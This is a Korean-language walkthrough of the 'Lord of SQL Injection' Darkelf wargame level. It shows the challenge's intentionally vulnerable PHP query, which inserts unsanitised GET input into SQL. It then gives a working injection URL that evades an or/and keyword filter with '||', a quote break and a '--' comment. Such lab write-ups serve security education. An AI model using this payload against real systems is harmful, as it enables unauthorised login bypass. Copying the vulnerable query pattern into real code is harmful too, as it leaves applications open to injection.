# Lord of SQL Injection No.6 Darkelf

Darkelf 문제는 `or`, `and`를 사용하지 않고 문제 조건에 알맞는 `id`값을 넣어 문제를 해결할 수 있도록 유도한 문제이다.

## 소스 코드
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect();  
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("darkelf"); 
  highlight_file(__FILE__); 
?>
```

```php
if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe");
```

Darkelf 문제에서 핵심이 되는 조건이다.

`preg_match` 함수에서 `or`, `and`를 만나면 `HeHe`를 출력하며 문제 풀이에 실패하게 된다.

기존에 사용했던 `or`와 `and`를 필터링하기 때문에 이들을 사용하지 않고 문제를 해결해야 한다.

#### 문제 풀이 조건

```php
$query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'";
```

```php
if($result['id'] == 'admin') solve("darkelf");
```

`$_GET`방식으로 `pw`를 입력받는다.

입력받은 id값이 `admin`과 일치하면 문제 풀이에 성공하게 된다.

## Solution

```
http://los.eagle-jump.org/darkelf_****.php?pw=' || id='admin' -- ;
```

`$_GET` 방식으로 `pw`를 받는 부분은 `'`로 닫아준다.

기존에 사용했던 `or` 연산자는 `||`로 우회가 가능하기 때문에 `||`를 사용한다.

`and` 연산자는 `&&`로 우회가 가능하지만 URL에 직접 대입할 시에는 `&`가 문자열을 구분할 때 사용하기 때문에
URL Encoding을 한 상태인 `%26`을 삽입하여 사용해야 한다.

`||`로 `or`를 우회한 뒤에 `id='admin'`을 입력하여 문제 풀이 조건을 충족시킨 후 `--`를 이용한 주석 처리로 뒤의 절을 무력화시키면 문제 풀이에 성공하게 된다.